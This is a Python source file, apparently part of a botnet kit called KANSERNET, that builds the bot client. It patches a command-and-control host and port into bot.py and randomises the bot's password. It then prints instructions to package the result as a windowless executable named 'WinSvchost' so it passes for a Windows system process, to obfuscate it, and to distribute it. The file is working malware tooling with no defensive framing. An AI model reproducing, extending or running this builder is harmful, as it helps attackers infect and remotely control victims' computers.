#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSERNET v1.0 — Bot Builder
Build + Encrypt + Pack
"""
import os, sys, socket, shutil, base64, random, string

def build_bot(c2_host=None, c2_port=6666):
    if not c2_host:
        c2_host = input("C2 Server IP: ").strip()
        if not c2_host:
            try: c2_host = socket.gethostbyname(socket.gethostname())
            except: c2_host = "127.0.0.1"

    with open("bot.py", "r", encoding="utf-8") as f: src = f.read()
    src = src.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{c2_host}"')
    src = src.replace('C2_PORT = 6666', f'C2_PORT = {c2_port}')
    src = src.replace('PASSWORD = "kansernet2026"', f'PASSWORD = "{"".join(random.choices(string.ascii_letters+string.digits,k=16))}"')

    out = "bot_built.py"
    with open(out, "w", encoding="utf-8") as f: f.write(src)
    print(f"[+] Bot built: {out}")
    print(f"[+] C2: {c2_host}:{c2_port}")
    print(f"\n[+] Build EXE:")
    print(f"    pip install pyinstaller cryptography")
    print(f"    pyinstaller --onefile --noconsole --name=WinSvchost {out}")
    print(f"\n[+] Obfuscate (optional):")
    print(f"    pip install pyarmor")
    print(f"    pyarmor obfuscate {out}")
    print(f"\n[+] Distribute: dist/WinSvchost.exe")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--host", help="C2 server IP")
    p.add_argument("--port", type=int, default=6666, help="C2 port")
    args = p.parse_args()
    build_bot(args.host, args.port)
